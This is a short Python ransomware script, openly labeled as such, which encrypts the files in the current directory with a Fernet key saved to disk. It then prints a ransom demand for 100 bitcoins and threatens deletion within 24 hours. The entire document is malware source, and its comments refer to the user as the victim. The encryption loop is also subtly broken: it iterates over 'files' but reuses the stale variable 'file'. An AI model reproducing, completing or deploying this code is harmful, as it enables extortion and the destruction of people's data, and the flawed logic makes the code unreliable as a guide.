#python3 ransomware 
#by leogzz0
#this program will go through your files and encrypt them

import os
from cryptography.fernet import Fernet

#let's find some files!!!

files = []

#loop to check all files in a directory
for file in os.listdir():
    #victim would not see this two files listed in their directory
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    #only files (not directories) would be appended to the files list
    if os.path.isfile(file):
        files.append(file) 

#print the files encrypted
print(files)

#fernet generate the key to decrypt all of the data (impossible to decrypt witouth the key)
key = Fernet.generate_key()

#create the file thekey.key with wb (write binary) for the key to be encrypted as well
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

#
for files in files:
    #open all of the files and read them in rb (read binary)
    with open(file, "rb") as thefile:
        #save all the binary files to the contents variable
        contents = thefile.read()
    #encryption of the content with the key
    contents_encrypted = Fernet(key).encrypt(contents)
    #open files and this time us wb (write binary)
    with open(file, "wb") as thefile:
        #write encrypted content back to the file
        thefile.write(contents_encrypted)

#message for the victim
print("All of your files have been encrypted!!! Send me 100 bitcoins or I'll delete them in 24 hours")